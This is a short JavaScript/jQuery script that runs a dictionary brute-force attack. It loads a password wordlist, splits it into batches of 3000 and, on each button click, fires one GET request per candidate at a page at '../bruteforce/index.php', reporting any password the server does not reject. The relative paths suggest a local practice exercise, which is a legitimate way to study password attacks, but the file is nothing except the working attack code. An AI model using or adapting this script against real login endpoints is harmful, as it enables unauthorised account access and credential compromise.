var passwords = [];
var tested = 0;

  // $.get('./dico.txt', function(data){passwords = data.split(/\n/);});

  $.ajax({
    type: 'GET',
    async: false,
    dataType: 'text',
    url: '../data/dico.txt',
    success: function (data){
      passwords = data.split(/\n/);
    },
  });

  var finalArray = [];
  var tempArray = [];
  while (passwords.length){
    tempArray = passwords.splice(0, 3000);
    finalArray.push(tempArray);
  }

function testEachPasswords(array){

  $.each( array, function(key, value){

    $.ajax({
      type: 'GET',
      url: '../bruteforce/index.php',
      data: 'password='+ value,
      success: function (data){
        if (data.indexOf('Erroneous') == -1){
          $('#response').html(value);
          console.log(value);
        } else {
          console.log('try again!');
          tested++;
          $('#tested').html(tested);
        }
      }
    });

  });


}

$('#button1').on('click', function(){
  testEachPasswords(finalArray[0]);
});

$('#button2').on('click', function(){
  testEachPasswords(finalArray[1]);
});

$('#button3').on('click', function(){
  testEachPasswords(finalArray[2]);
});

$('#button4').on('click', function(){
  testEachPasswords(finalArray[3]);
});

$('#button5').on('click', function(){
  testEachPasswords(finalArray[4]);
});
